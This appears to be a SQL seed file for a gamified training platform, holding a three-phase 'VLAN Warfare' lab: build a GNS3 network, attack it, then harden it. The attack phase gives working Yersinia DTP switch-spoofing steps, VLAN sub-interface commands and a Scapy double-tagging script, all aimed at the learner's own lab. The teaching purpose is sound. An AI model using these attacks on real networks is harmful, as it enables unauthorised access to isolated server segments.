-- ═══════════════════════════════════════════════════════════════════
-- Lab 01 — VLAN Warfare : flagship content (build / attack / harden)
-- Content is trusted, authored markdown (rendered as HTML in the client).
-- Uses dollar-quoting ($md$...$md$) so quotes/backticks need no escaping.
-- ═══════════════════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Build a 3-VLAN switched network with router-on-a-stick, then walk straight into a VLAN you were never allowed to touch — by convincing the switch you ARE a switch.'
WHERE id = 1;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Build the Battlefield',
  is_pro_only = false,
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Build the Battlefield</h3>
<p>Before you can break a network, you need one worth breaking. You're standing up a small corporate LAN: two switches, three VLANs, and one very juicy server holding the <code>crown jewels</code>. Users live in VLAN 10. Servers live in VLAN 20. They are <strong>never</strong> supposed to talk directly.</p>
<p>By the end of this lab, your Kali box — plugged into a lowly user port — will be reading the server VLAN's traffic. But first: build it exactly as a slightly-careless junior admin would. That carelessness is the whole point.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 500 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~20 min</span>
<span class="chip loot">⚿ Loot: VLANs · 802.1Q trunking · router-on-a-stick</span>
</div>

## Your arsenal (GNS3)

Drag these into a fresh GNS3 project:

| Device | Role | Suggested image |
|---|---|---|
| SW1, SW2 | The switches you'll fight over | Cisco IOSvL2 / vIOS-L2 |
| R1 | Router-on-a-stick (inter-VLAN routing) | Cisco IOSv / vIOS |
| PC1 | Innocent user, VLAN 10 | VPCS |
| SRV1 | The crown jewels, VLAN 20 | VPCS (or Ubuntu docker) |
| KALI | You. The problem. | Kali Linux |

Wire it like the topology above: `PC1→SW1 Fa0/1`, `KALI→SW1 Fa0/3`, `SW1↔SW2` on `Fa0/2`, `R1→SW1` on `Fa0/24`, `SRV1→SW2 Fa0/1`.

<ul class="objectives">
<li>Create VLANs 10, 20, 99 on both switches</li>
<li>Put PC1 in VLAN 10 and SRV1 in VLAN 20 (access ports)</li>
<li>Trunk SW1↔SW2 and R1↔SW1</li>
<li>Give R1 a sub-interface gateway per VLAN</li>
<li>Leave KALI's port on its lazy default (this is the trap)</li>
<li>Prove PC1 and SRV1 work — then that they CAN'T reach each other</li>
</ul>

## Step 1 — Carve up the VLANs (SW1 **and** SW2)

Run this on **both** switches:

```
enable
configure terminal
vlan 10
 name USERS
vlan 20
 name SERVERS
vlan 99
 name PARKING
end
```

## Step 2 — Access ports for the honest citizens

On **SW1**, hand PC1 its VLAN:

```
configure terminal
interface FastEthernet0/1
 description PC1-USER
 switchport mode access
 switchport access vlan 10
end
```

On **SW2**, do the same for the server:

```
configure terminal
interface FastEthernet0/1
 description SRV1-CROWN-JEWELS
 switchport mode access
 switchport access vlan 20
end
```

## Step 3 — Build the trunks

Trunks carry every VLAN between devices. SW1↔SW2 and R1↔SW1:

```
! On SW1
interface FastEthernet0/2
 description TRUNK-TO-SW2
 switchport trunk encapsulation dot1q
 switchport mode trunk
!
interface FastEthernet0/24
 description TRUNK-TO-R1
 switchport trunk encapsulation dot1q
 switchport mode trunk
end
```

```
! On SW2
interface FastEthernet0/2
 description TRUNK-TO-SW1
 switchport trunk encapsulation dot1q
 switchport mode trunk
end
```

<div class="callout info">
<p>If your switch image rejects <code>switchport trunk encapsulation dot1q</code>, it only speaks 802.1Q anyway — just skip that line and run <code>switchport mode trunk</code> on its own.</p>
</div>

## Step 4 — Router-on-a-stick (so VLANs can reach the outside)

One physical link, one sub-interface per VLAN. On **R1**:

```
configure terminal
interface GigabitEthernet0/0
 no shutdown
!
interface GigabitEthernet0/0.10
 encapsulation dot1Q 10
 ip address 10.0.10.1 255.255.255.0
!
interface GigabitEthernet0/0.20
 encapsulation dot1Q 20
 ip address 10.0.20.1 255.255.255.0
end
write memory
```

## Step 5 — Address the hosts

On **PC1** (VPCS):
```
ip 10.0.10.10 255.255.255.0 10.0.10.1
```
On **SRV1** (VPCS):
```
ip 10.0.20.10 255.255.255.0 10.0.20.1
```

## Step 6 — Plant the trap 🪤

Here's the "careless junior admin" move. KALI's port keeps Cisco's **default** setting — which quietly offers to become a trunk to anyone who asks:

```
! On SW1 — the deliberately weak port
configure terminal
interface FastEthernet0/3
 description KALI-USER-PORT
 switchport mode dynamic auto
end
```

<div class="callout warn">
<p><strong>This is the vulnerability.</strong> <code>dynamic auto</code> means "I won't start a trunk, but I'll happily <em>accept</em> one if the other side asks." On a user port, that's a loaded gun. You'll pull the trigger in Phase 2.</p>
</div>

## Step 7 — Sanity check

```
ping 10.0.10.1        ! from PC1 → its gateway: should work
```
From PC1, try to reach the server directly:
```
ping 10.0.20.10       ! should FAIL or route via R1 only — VLANs are isolated
```

If PC1 reaches its gateway and the two VLANs are properly separated, the battlefield is ready.

<div class="achievement">
<span class="medal">🏗️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Network Architect — you built the thing you're about to wreck</span></span>
</div>

**Next:** Phase 2. You're a switch now. Congratulations.
$md$
WHERE lab_id = 1 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Become the Switch',
  is_pro_only = false,
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>Become the Switch</h3>
<p>Your Kali box is plugged into a <strong>user</strong> port. It should only ever see VLAN 10. But you built SW1 with a friendly, trusting <code>dynamic auto</code> port — and switches negotiate trunks with a little protocol called <strong>DTP</strong>. So you're going to ask, politely, in DTP: <em>"hey, wanna form a trunk?"</em> The switch says yes. And a trunk carries <strong>every</strong> VLAN.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> every command here runs against <strong>your own GNS3 lab</strong>. Running this on a network you don't own is a crime, not a lab. Keep it in the sandbox.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 700 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: DTP switch-spoofing · 802.1Q sub-interfaces · VLAN hopping</span>
</div>

## Step 1 — Confirm you're boxed in

On Kali, look at your link. Right now you're a plain access port in VLAN 10 — you can't see VLAN 20:

```
ip -br link show eth0
ping -c 2 10.0.20.10        # crown jewels — should be unreachable right now
```
That silence is the "before" picture. Let's change it.

## Step 2 — Ask the switch to trunk (Yersinia)

Yersinia ships with Kali and speaks DTP fluently. The GUI is the friendliest:

```
sudo yersinia -G
```

In the window: **Launch attack → DTP → "enabling trunking" → OK.**

Prefer the terminal? Use the interactive ncurses UI:

```
sudo yersinia -I
# press  g  → choose DTP
# press  x  → choose  1) enabling trunking
```

Yersinia now blasts DTP frames offering to trunk. SW1's `dynamic auto` port accepts. Give it ~30 seconds.

<div class="callout tip">
<p>Peek at SW1 to watch it happen: <code>show interfaces fastEthernet 0/3 switchport</code> — <code>Operational Mode</code> will flip from <code>static access</code> to <code>trunk</code>. You just talked a switch into promoting your port.</p>
</div>

## Step 3 — Tap the VLAN you were never allowed into

Your port is a trunk now, so the wire is delivering 802.1Q-tagged frames for all VLANs. Build a sub-interface for VLAN 20 and give yourself an address in the server subnet:

```
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip addr add 10.0.20.66/24 dev eth0.20
sudo ip link set eth0.20 up
```

Now knock on the crown jewels' door:

```
ping -c 4 10.0.20.10
```

<div class="callout tip">
<p><strong>💥 That's the moment.</strong> Replies from <code>10.0.20.10</code> — a host in a VLAN your port had no business reaching — landing in your terminal. Fire up Wireshark on <code>eth0.20</code> and watch VLAN 20 traffic you were architecturally forbidden from seeing.</p>
</div>

<div class="achievement">
<span class="medal">👻</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">VLAN Ghost — you're in a VLAN that doesn't know you exist</span></span>
</div>

<div class="boss">
<span class="tag">☠ BOSS FIGHT — optional, +300 XP</span>
<h3>Double Tagging: hop a VLAN with no trunk at all</h3>
<p>Switch-spoofing is loud. The subtle cousin is <strong>double tagging</strong>: you wrap a frame in <em>two</em> 802.1Q tags. The first switch strips the outer tag (if it matches the trunk's <strong>native VLAN</strong>) and forwards the inner-tagged frame across the trunk — straight into VLAN 20. It's one-way and blind, but it needs no DTP and no trunk on your port. It works precisely because the trunk's native VLAN was left at the default.</p>
</div>

Craft it with Scapy. Outer tag = native VLAN (1), inner tag = target VLAN (20):

```
sudo python3
```
```python
from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
pkt = ( Ether(dst="ff:ff:ff:ff:ff:ff")
        / Dot1Q(vlan=1)      # outer — matches native, gets stripped by SW1
        / Dot1Q(vlan=20)     # inner — survives, delivered into VLAN 20
        / IP(dst="10.0.20.10")
        / ICMP() )
sendp(pkt, iface="eth0", count=5)
```

You won't see replies (the return path can't tag its way back to you) — but sniff SRV1's link and you'll see your ICMP arriving inside VLAN 20. Injection into a segment you can't even receive from. Nasty.

<div class="achievement">
<span class="medal">🎭</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Double Agent — one frame, two tags, zero permission</span></span>
</div>

**Next:** you found the door wide open. Phase 3 is where you weld it shut — and prove the same attack now bounces off.
$md$
WHERE lab_id = 1 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Slam the Door',
  is_pro_only = false,
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Slam the Door</h3>
<p>You walked in because two doors were left open: <strong>DTP</strong> was allowed to negotiate a trunk on a user port, and the trunk's <strong>native VLAN</strong> was left at the lazy default. Close both. Then re-run Phase 2 and watch it fail — that failure is the whole reward.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 800 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: nonegotiate · native-VLAN hygiene · port lockdown</span>
</div>

<ul class="objectives">
<li>Force every user port to hard access mode and kill DTP</li>
<li>Move the trunk's native VLAN off the default and prune it</li>
<li>Black-hole and shut down every unused port</li>
<li>Re-run the DTP attack → it fails</li>
<li>Re-run double tagging → it's dropped</li>
</ul>

## Fix 1 — Nail down the user ports (kills switch-spoofing)

`switchport nonegotiate` disables DTP entirely — the port will never form a trunk by negotiation again. On **SW1**:

```
configure terminal
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
!
interface FastEthernet0/3
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
end
```

## Fix 2 — Fix the native VLAN (kills double tagging)

Set the trunk's native VLAN to an unused parking VLAN, and allow only what belongs. On **both** switches' trunk ports:

```
configure terminal
interface FastEthernet0/2
 switchport trunk native vlan 99
 switchport trunk allowed vlan 10,20,99
 switchport nonegotiate
end
```
Because your attacker frame's outer tag (1) no longer matches the native VLAN (99), SW1 won't strip-and-forward it. The double tag dies on arrival.

## Fix 3 — Black-hole the unused ports

An open unused port is a future incident. Park them all in a dead VLAN and shut them:

```
configure terminal
vlan 999
 name BLACKHOLE
!
interface range FastEthernet0/4 - 23
 switchport mode access
 switchport access vlan 999
 switchport nonegotiate
 shutdown
end
write memory
```

## Re-run the attack (the fun part)

Back on Kali, try Phase 2 again:

```
sudo yersinia -G      # Launch attack → DTP → enabling trunking
```
Then check SW1:
```
show interfaces fastEthernet 0/3 switchport
```

<div class="callout tip">
<p><code>Operational Mode: static access</code> and <code>Negotiation of Trunking: Off</code>. Yersinia is screaming DTP into a port that has stopped listening. No trunk, no VLAN hop. Your <code>eth0.20</code> sub-interface now pings into the void.</p>
</div>

## Prove it to the grader

These three checks are your victory conditions:

```
show interfaces trunk          ! only Fa0/2 (real trunk) — NOT Fa0/3
show interfaces fa0/3 switchport   ! Mode: access, Negotiation: Off
show vlan brief                ! unused ports parked in VLAN 999
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Gatekeeper — you closed the door you walked through</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>VLAN Warfare — cleared</h3>
<p>You built a network, became a switch, ghosted into a forbidden VLAN, injected a double-tagged frame with no trunk at all — and then made every one of those attacks bounce. That's the entire discipline of switching security in one sitting: <code>build → attack → harden</code>.</p>
<p><strong>Total: 2800 XP</strong> · Next target: <code>Lab 02 — STP Sabotage</code>, where you steal the spanning-tree crown.</p>
</div>
$md$
WHERE lab_id = 1 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  1,
  $svg$<svg viewBox="0 0 320 200" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <line x1="90" y1="70" x2="230" y2="70" stroke="#6b7480" stroke-width="3"/>
  <text x="160" y="62" text-anchor="middle" font-size="9" fill="#6b7480">802.1Q TRUNK</text>
  <line x1="70" y1="150" x2="70" y2="92" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <line x1="250" y1="150" x2="250" y2="92" stroke="#7c3aed" stroke-width="2"/>
  <rect x="30" y="52" width="80" height="36" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="70" y="74" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <rect x="210" y="52" width="80" height="36" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="250" y="74" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW2</text>
  <rect x="28" y="150" width="84" height="34" rx="7" fill="#fff" stroke="#e5484d" stroke-width="1.6"/>
  <text x="70" y="168" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI</text>
  <text x="70" y="179" text-anchor="middle" font-size="8" fill="#6b7480">attacker</text>
  <rect x="206" y="150" width="88" height="34" rx="7" fill="#fff" stroke="#7c3aed" stroke-width="1.6"/>
  <text x="250" y="168" text-anchor="middle" font-size="11" fill="#7c3aed" font-weight="600">SRV1 🏆</text>
  <text x="250" y="179" text-anchor="middle" font-size="8" fill="#6b7480">VLAN 20</text>
</svg>$svg$,
  $svg$<svg viewBox="0 0 760 440" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <!-- links -->
  <line x1="380" y1="72" x2="212" y2="168" stroke="#6b7480" stroke-width="2.5"/>
  <text x="300" y="112" text-anchor="middle" font-size="10" fill="#6b7480">trunk</text>
  <line x1="272" y1="196" x2="488" y2="196" stroke="#6b7480" stroke-width="4"/>
  <line x1="118" y1="330" x2="180" y2="222" stroke="#2563eb" stroke-width="2"/>
  <line x1="310" y1="338" x2="238" y2="222" stroke="#e5484d" stroke-width="2.2" stroke-dasharray="6 4"/>
  <line x1="628" y1="330" x2="556" y2="222" stroke="#7c3aed" stroke-width="2"/>

  <!-- trunk label -->
  <rect x="316" y="185" width="128" height="22" rx="11" fill="#fff" stroke="#e6e8ec"/>
  <text x="380" y="200" text-anchor="middle" font-size="10.5" fill="#6b7480">802.1Q TRUNK</text>

  <!-- R1 -->
  <rect x="328" y="28" width="104" height="44" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="380" y="49" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1</text>
  <text x="380" y="63" text-anchor="middle" font-size="9" fill="#6b7480">router-on-a-stick</text>

  <!-- SW1 -->
  <rect x="140" y="170" width="132" height="52" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="206" y="193" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW1</text>
  <text x="206" y="210" text-anchor="middle" font-size="9" fill="#6b7480">VLAN 10 · 20 · 99</text>

  <!-- SW2 -->
  <rect x="488" y="170" width="132" height="52" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="554" y="193" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW2</text>
  <text x="554" y="210" text-anchor="middle" font-size="9" fill="#6b7480">VLAN 10 · 20 · 99</text>

  <!-- PC1 -->
  <rect x="56" y="330" width="118" height="46" rx="9" fill="#fff" stroke="#2563eb" stroke-width="1.6"/>
  <text x="115" y="352" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1</text>
  <text x="115" y="367" text-anchor="middle" font-size="8.5" fill="#6b7480">VLAN 10 · 10.0.10.10</text>

  <!-- KALI -->
  <rect x="250" y="338" width="128" height="50" rx="9" fill="#fff" stroke="#e5484d" stroke-width="1.8"/>
  <text x="314" y="360" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="700">KALI · attacker</text>
  <text x="314" y="375" text-anchor="middle" font-size="8.5" fill="#6b7480">Fa0/3 · dynamic-auto ⚠</text>

  <!-- SRV1 -->
  <rect x="560" y="330" width="140" height="48" rx="9" fill="#fff" stroke="#7c3aed" stroke-width="1.8"/>
  <text x="630" y="352" text-anchor="middle" font-size="12" fill="#7c3aed" font-weight="700">SRV1 · 🏆</text>
  <text x="630" y="367" text-anchor="middle" font-size="8.5" fill="#6b7480">VLAN 20 · 10.0.20.10</text>
</svg>$svg$,
  $json$["VLAN 10 — Users","VLAN 20 — Servers (target)","802.1Q Trunk","Attacker (Kali)"]$json$::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
